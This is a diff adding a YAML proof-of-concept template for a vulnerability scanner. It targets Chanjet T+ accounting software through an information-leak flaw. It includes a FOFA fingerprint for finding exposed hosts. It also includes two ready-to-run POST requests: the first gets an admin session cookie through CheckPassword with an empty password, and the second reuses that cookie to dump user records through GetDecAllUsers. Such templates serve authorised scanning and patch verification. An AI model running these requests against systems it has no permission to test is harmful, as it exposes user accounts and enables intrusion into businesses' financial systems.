@@ -1,0 +1,31 @@
+id: poc-yaml-changjie-tplus-getdecallusers-information-leak
+info:
+  name: 畅捷通T+ getdecallusers 信息泄露漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 信息泄露
+  finger: 畅捷通T+
+  fofa: app="畅捷通-TPlus"
+requests:
+- method: POST
+  path: /tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword
+  headers:
+    Content-Type: application/json
+  data: '{"AccountNum": "000", "UserName": "admin", "Password": "", "rdpYear": "2023",
+    "rdpMonth": "5", "rdpDate": "17", "webServiceProcessID": "admin", "ali_csessionid":
+    "", "ali_sig": "", "ali_token": "", "ali_scene": "", "role": "", "aqdKey": "",
+    "fromWhere": "browser", "cardNo": ""}'
+  expression: status_code == 200 && contains(body,"\"error\"") && contains(headers,"Cookie")
+  output:
+  - regex_match(headers,"ASP.NET_SessionId=(?P<cookie>.*);")
+- method: POST
+  path: /tplus/sm/privilege/ajaxpro/Ufida.T.SM.UIP.Privilege.PreviligeControl,Ufida.T.SM.UIP.ashx?method=GetDecAllUsers
+  headers:
+    Content-Type: application/json
+    Cookie: ASP.NET_SessionId={{.cookie}}
+  data: '{"condition": "", "accNum": "", "onlyBuying": "false"}'
+  expression: status_code == 200 && contains(body,"\"value\"") && contains(body,"UserId")
+    && contains(body,"UFTData")
+variables: {}
+transport: http
